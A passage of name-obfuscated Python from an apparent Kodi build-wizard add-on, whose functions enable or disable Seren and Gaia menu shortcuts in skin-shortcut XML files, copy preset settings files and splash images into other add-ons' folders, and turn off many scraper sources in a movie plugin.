		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:595
    with open (OO00OO00O00O00000 ,'w')as O0000OO000000OOO0 :#line:598
      O0000OO000000OOO0 .write (O0OOO0O0OOO0O0OOO )#line:599
    OO00OO00O00O00000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:602
    with open (OO00OO00O00O00000 ,'r')as O0000OO000000OOO0 :#line:603
      O0OOO0O0OOO0O0OOO =O0000OO000000OOO0 .read ()#line:604
    O0OOO0O0OOO0O0OOO =O0OOO0O0OOO0O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:622
    with open (OO00OO00O00O00000 ,'w')as O0000OO000000OOO0 :#line:625
      O0000OO000000OOO0 .write (O0OOO0O0OOO0O0OOO )#line:626
def rdbuildinstall ():#line:629
  try :#line:630
   O0O0O0O000O0O0OO0 =(ADDON .getSetting ("rdbuild"))#line:631
   if O0O0O0O000O0O0OO0 =='true':#line:632
     O000O0O0000000OO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:633
     O0O000OO00O0OO0O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:634
     copyfile (O000O0O0000000OO0 ,O0O000OO00O0OO0O0 )#line:635
  except :#line:636
     pass #line:637
def rdbuildaddonoff ():#line:640
    OOOOOOOOOOOOO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:643
    with open (OOOOOOOOOOOOO0O0O ,'r')as O00OOO00O0000OOOO :#line:644
      OOOO0OOOO00OO000O =O00OOO00O0000OOOO .read ()#line:645
    OOOO0OOOO00OO000O =OOOO0OOOO00OO000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:663
    with open (OOOOOOOOOOOOO0O0O ,'w')as O00OOO00O0000OOOO :#line:666
      O00OOO00O0000OOOO .write (OOOO0OOOO00OO000O )#line:667
    OOOOOOOOOOOOO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:671
    with open (OOOOOOOOOOOOO0O0O ,'r')as O00OOO00O0000OOOO :#line:672
      OOOO0OOOO00OO000O =O00OOO00O0000OOOO .read ()#line:673
    OOOO0OOOO00OO000O =OOOO0OOOO00OO000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:691
    with open (OOOOOOOOOOOOO0O0O ,'w')as O00OOO00O0000OOOO :#line:694
      O00OOO00O0000OOOO .write (OOOO0OOOO00OO000O )#line:695
    OOOOOOOOOOOOO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:699
    with open (OOOOOOOOOOOOO0O0O ,'r')as O00OOO00O0000OOOO :#line:700
      OOOO0OOOO00OO000O =O00OOO00O0000OOOO .read ()#line:701
    OOOO0OOOO00OO000O =OOOO0OOOO00OO000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:719
    with open (OOOOOOOOOOOOO0O0O ,'w')as O00OOO00O0000OOOO :#line:722
      O00OOO00O0000OOOO .write (OOOO0OOOO00OO000O )#line:723
    OOOOOOOOOOOOO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:727
    with open (OOOOOOOOOOOOO0O0O ,'r')as O00OOO00O0000OOOO :#line:728
      OOOO0OOOO00OO000O =O00OOO00O0000OOOO .read ()#line:729
    OOOO0OOOO00OO000O =OOOO0OOOO00OO000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:747
    with open (OOOOOOOOOOOOO0O0O ,'w')as O00OOO00O0000OOOO :#line:750
      O00OOO00O0000OOOO .write (OOOO0OOOO00OO000O )#line:751
    OOOOOOOOOOOOO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:754
    with open (OOOOOOOOOOOOO0O0O ,'r')as O00OOO00O0000OOOO :#line:755
      OOOO0OOOO00OO000O =O00OOO00O0000OOOO .read ()#line:756
    OOOO0OOOO00OO000O =OOOO0OOOO00OO000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:774
    with open (OOOOOOOOOOOOO0O0O ,'w')as O00OOO00O0000OOOO :#line:777
      O00OOO00O0000OOOO .write (OOOO0OOOO00OO000O )#line:778
    OOOOOOOOOOOOO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:780
    with open (OOOOOOOOOOOOO0O0O ,'r')as O00OOO00O0000OOOO :#line:781
      OOOO0OOOO00OO000O =O00OOO00O0000OOOO .read ()#line:782
    OOOO0OOOO00OO000O =OOOO0OOOO00OO000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:800
    with open (OOOOOOOOOOOOO0O0O ,'w')as O00OOO00O0000OOOO :#line:803
      O00OOO00O0000OOOO .write (OOOO0OOOO00OO000O )#line:804
    OOOOOOOOOOOOO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:806
    with open (OOOOOOOOOOOOO0O0O ,'r')as O00OOO00O0000OOOO :#line:807
      OOOO0OOOO00OO000O =O00OOO00O0000OOOO .read ()#line:808
    OOOO0OOOO00OO000O =OOOO0OOOO00OO000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:826
    with open (OOOOOOOOOOOOO0O0O ,'w')as O00OOO00O0000OOOO :#line:829
      O00OOO00O0000OOOO .write (OOOO0OOOO00OO000O )#line:830
    OOOOOOOOOOOOO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:833
    with open (OOOOOOOOOOOOO0O0O ,'r')as O00OOO00O0000OOOO :#line:834
      OOOO0OOOO00OO000O =O00OOO00O0000OOOO .read ()#line:835
    OOOO0OOOO00OO000O =OOOO0OOOO00OO000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:853
    with open (OOOOOOOOOOOOO0O0O ,'w')as O00OOO00O0000OOOO :#line:856
      O00OOO00O0000OOOO .write (OOOO0OOOO00OO000O )#line:857
def rdbuildinstalloff ():#line:860
    try :#line:861
       O000OOO0O0OO00O00 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:862
       OO0O0000O0OOOOOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:863
       copyfile (O000OOO0O0OO00O00 ,OO0O0000O0OOOOOO0 )#line:865
       O000OOO0O0OO00O00 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:867
       OO0O0000O0OOOOOO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:868
       copyfile (O000OOO0O0OO00O00 ,OO0O0000O0OOOOOO0 )#line:870
       O000OOO0O0OO00O00 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:872
       OO0O0000O0OOOOOO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:873
       copyfile (O000OOO0O0OO00O00 ,OO0O0000O0OOOOOO0 )#line:875
       O000OOO0O0OO00O00 =ADDONPATH +"/resources/rdoff/Splash.png"#line:878
       OO0O0000O0OOOOOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:879
       copyfile (O000OOO0O0OO00O00 ,OO0O0000O0OOOOOO0 )#line:881
    except :#line:883
       pass #line:884
def rdbuildaddonON ():#line:891
    OOOOO0OOO0OOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:893
    with open (OOOOO0OOO0OOOO00O ,'r')as OO0OO0O0OO000000O :#line:894
      O0OO0OOOOOO00OO0O =OO0OO0O0OO000000O .read ()#line:895
    O0OO0OOOOOO00OO0O =O0OO0OOOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:913
    with open (OOOOO0OOO0OOOO00O ,'w')as OO0OO0O0OO000000O :#line:916
      OO0OO0O0OO000000O .write (O0OO0OOOOOO00OO0O )#line:917
    OOOOO0OOO0OOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:921
    with open (OOOOO0OOO0OOOO00O ,'r')as OO0OO0O0OO000000O :#line:922
      O0OO0OOOOOO00OO0O =OO0OO0O0OO000000O .read ()#line:923
    O0OO0OOOOOO00OO0O =O0OO0OOOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:941
    with open (OOOOO0OOO0OOOO00O ,'w')as OO0OO0O0OO000000O :#line:944
      OO0OO0O0OO000000O .write (O0OO0OOOOOO00OO0O )#line:945
    OOOOO0OOO0OOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:949
    with open (OOOOO0OOO0OOOO00O ,'r')as OO0OO0O0OO000000O :#line:950
      O0OO0OOOOOO00OO0O =OO0OO0O0OO000000O .read ()#line:951
    O0OO0OOOOOO00OO0O =O0OO0OOOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:969
    with open (OOOOO0OOO0OOOO00O ,'w')as OO0OO0O0OO000000O :#line:972
      OO0OO0O0OO000000O .write (O0OO0OOOOOO00OO0O )#line:973
    OOOOO0OOO0OOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:977
    with open (OOOOO0OOO0OOOO00O ,'r')as OO0OO0O0OO000000O :#line:978
      O0OO0OOOOOO00OO0O =OO0OO0O0OO000000O .read ()#line:979
    O0OO0OOOOOO00OO0O =O0OO0OOOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:997
    with open (OOOOO0OOO0OOOO00O ,'w')as OO0OO0O0OO000000O :#line:1000
      OO0OO0O0OO000000O .write (O0OO0OOOOOO00OO0O )#line:1001
    OOOOO0OOO0OOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1004
    with open (OOOOO0OOO0OOOO00O ,'r')as OO0OO0O0OO000000O :#line:1005
      O0OO0OOOOOO00OO0O =OO0OO0O0OO000000O .read ()#line:1006
    O0OO0OOOOOO00OO0O =O0OO0OOOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1024
    with open (OOOOO0OOO0OOOO00O ,'w')as OO0OO0O0OO000000O :#line:1027
      OO0OO0O0OO000000O .write (O0OO0OOOOOO00OO0O )#line:1028
    OOOOO0OOO0OOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1030
    with open (OOOOO0OOO0OOOO00O ,'r')as OO0OO0O0OO000000O :#line:1031
      O0OO0OOOOOO00OO0O =OO0OO0O0OO000000O .read ()#line:1032
    O0OO0OOOOOO00OO0O =O0OO0OOOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1050
    with open (OOOOO0OOO0OOOO00O ,'w')as OO0OO0O0OO000000O :#line:1053
      OO0OO0O0OO000000O .write (O0OO0OOOOOO00OO0O )#line:1054
    OOOOO0OOO0OOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1056
    with open (OOOOO0OOO0OOOO00O ,'r')as OO0OO0O0OO000000O :#line:1057
      O0OO0OOOOOO00OO0O =OO0OO0O0OO000000O .read ()#line:1058
    O0OO0OOOOOO00OO0O =O0OO0OOOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1076
    with open (OOOOO0OOO0OOOO00O ,'w')as OO0OO0O0OO000000O :#line:1079
      OO0OO0O0OO000000O .write (O0OO0OOOOOO00OO0O )#line:1080
    OOOOO0OOO0OOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1083
    with open (OOOOO0OOO0OOOO00O ,'r')as OO0OO0O0OO000000O :#line:1084
      O0OO0OOOOOO00OO0O =OO0OO0O0OO000000O .read ()#line:1085
    O0OO0OOOOOO00OO0O =O0OO0OOOOOO00OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1103
    with open (OOOOO0OOO0OOOO00O ,'w')as OO0OO0O0OO000000O :#line:1106
      OO0OO0O0OO000000O .write (O0OO0OOOOOO00OO0O )#line:1107
def rdbuildinstallON ():#line:1110
    try :#line:1112
       OOOOO0OOOO0OOO000 =ADDONPATH +"/resources/rd/victory.xml"#line:1113
       OOO0OOOO0000O000O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1114
       copyfile (OOOOO0OOOO0OOO000 ,OOO0OOOO0000O000O )#line:1116
       OOOOO0OOOO0OOO000 =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1118
       OOO0OOOO0000O000O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1119
       copyfile (OOOOO0OOOO0OOO000 ,OOO0OOOO0000O000O )#line:1121
       OOOOO0OOOO0OOO000 =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1123
       OOO0OOOO0000O000O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1124
       copyfile (OOOOO0OOOO0OOO000 ,OOO0OOOO0000O000O )#line:1126
       OOOOO0OOOO0OOO000 =ADDONPATH +"/resources/rd/Splash.png"#line:1129
       OOO0OOOO0000O000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1130
       copyfile (OOOOO0OOOO0OOO000 ,OOO0OOOO0000O000O )#line:1132
    except :#line:1134
       pass #line:1135
def rdbuild ():#line:1145
	OOOO000O0OOO00O00 =(ADDON .getSetting ("rdbuild"))#line:1146
	if OOOO000O0OOO00O00 =='true':#line:1147
		O0000000O0O0O0O00 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1148
		O0000000O0O0O0O00 .setSetting ('all_t','0')#line:1149
		O0000000O0O0O0O00 .setSetting ('rd_menu_enable','false')#line:1150
		O0000000O0O0O0O00 .setSetting ('magnet_bay','false')#line:1151
		O0000000O0O0O0O00 .setSetting ('magnet_extra','false')#line:1152
		O0000000O0O0O0O00 .setSetting ('rd_only','false')#line:1153
		O0000000O0O0O0O00 .setSetting ('ftp','false')#line:1155
		O0000000O0O0O0O00 .setSetting ('fp','false')#line:1156
		O0000000O0O0O0O00 .setSetting ('filter_fp','false')#line:1157
		O0000000O0O0O0O00 .setSetting ('fp_size_en','false')#line:1158
		O0000000O0O0O0O00 .setSetting ('afdah','false')#line:1159
		O0000000O0O0O0O00 .setSetting ('ap2s','false')#line:1160
		O0000000O0O0O0O00 .setSetting ('cin','false')#line:1161
		O0000000O0O0O0O00 .setSetting ('clv','false')#line:1162
		O0000000O0O0O0O00 .setSetting ('cmv','false')#line:1163
		O0000000O0O0O0O00 .setSetting ('dl20','false')#line:1164
		O0000000O0O0O0O00 .setSetting ('esc','false')#line:1165
		O0000000O0O0O0O00 .setSetting ('extra','false')#line:1166
		O0000000O0O0O0O00 .setSetting ('film','false')#line:1167
		O0000000O0O0O0O00 .setSetting ('fre','false')#line:1168
		O0000000O0O0O0O00 .setSetting ('fxy','false')#line:1169
		O0000000O0O0O0O00 .setSetting ('genv','false')#line:1170
		O0000000O0O0O0O00 .setSetting ('getgo','false')#line:1171
		O0000000O0O0O0O00 .setSetting ('gold','false')#line:1172
		O0000000O0O0O0O00 .setSetting ('gona','false')#line:1173
		O0000000O0O0O0O00 .setSetting ('hdmm','false')#line:1174
		O0000000O0O0O0O00 .setSetting ('hdt','false')#line:1175
		O0000000O0O0O0O00 .setSetting ('icy','false')#line:1176
		O0000000O0O0O0O00 .setSetting ('ind','false')#line:1177
		O0000000O0O0O0O00 .setSetting ('iwi','false')#line:1178
		O0000000O0O0O0O00 .setSetting ('jen_free','false')#line:1179
		O0000000O0O0O0O00 .setSetting ('kiss','false')#line:1180
		O0000000O0O0O0O00 .setSetting ('lavin','false')#line:1181
		O0000000O0O0O0O00 .setSetting ('los','false')#line:1182
		O0000000O0O0O0O00 .setSetting ('m4u','false')#line:1183
		O0000000O0O0O0O00 .setSetting ('mesh','false')#line:1184
		O0000000O0O0O0O00 .setSetting ('mf','false')#line:1185
		O0000000O0O0O0O00 .setSetting ('mkvc','false')#line:1186
		O0000000O0O0O0O00 .setSetting ('mjy','false')#line:1187
		O0000000O0O0O0O00 .setSetting ('hdonline','false')#line:1188
		O0000000O0O0O0O00 .setSetting ('moviex','false')#line:1189
		O0000000O0O0O0O00 .setSetting ('mpr','false')#line:1190
		O0000000O0O0O0O00 .setSetting ('mvg','false')#line:1191
		O0000000O0O0O0O00 .setSetting ('mvl','false')#line:1192
		O0000000O0O0O0O00 .setSetting ('mvs','false')#line:1193
		O0000000O0O0O0O00 .setSetting ('myeg','false')#line:1194
		O0000000O0O0O0O00 .setSetting ('ninja','false')#line:1195
		O0000000O0O0O0O00 .setSetting ('odb','false')#line:1196
		O0000000O0O0O0O00 .setSetting ('ophd','false')#line:1197
		O0000000O0O0O0O00 .setSetting ('pks','false')#line:1198
		O0000000O0O0O0O00 .setSetting ('prf','false')#line:1199
		O0000000O0O0O0O00 .setSetting ('put18','false')#line:1200
		O0000000O0O0O0O00 .setSetting ('req','false')#line:1201
		O0000000O0O0O0O00 .setSetting ('rftv','false')#line:1202
		O0000000O0O0O0O00 .setSetting ('rltv','false')#line:1203
		O0000000O0O0O0O00 .setSetting ('sc','false')#line:1204
		O0000000O0O0O0O00 .setSetting ('seehd','false')#line:1205
		O0000000O0O0O0O00 .setSetting ('showbox','false')#line:1206
		O0000000O0O0O0O00 .setSetting ('shuid','false')#line:1207
		O0000000O0O0O0O00 .setSetting ('sil_gh','false')#line:1208
		O0000000O0O0O0O00 .setSetting ('spv','false')#line:1209
		O0000000O0O0O0O00 .setSetting ('subs','false')#line:1210
		O0000000O0O0O0O00 .setSetting ('tvs','false')#line:1211
		O0000000O0O0O0O00 .setSetting ('tw','false')#line:1212
		O0000000O0O0O0O00 .setSetting ('upto','false')#line:1213
		O0000000O0O0O0O00 .setSetting ('vel','false')#line:1214
		O0000000O0O0O0O00 .setSetting ('vex','false')#line:1215
		O0000000O0O0O0O00 .setSetting ('vidc','false')#line:1216
		O0000000O0O0O0O00 .setSetting ('w4hd','false')#line:1217
		O0000000O0O0O0O00 .setSetting ('wav','false')#line:1218
		O0000000O0O0O0O00 .setSetting ('wf','false')#line:1219
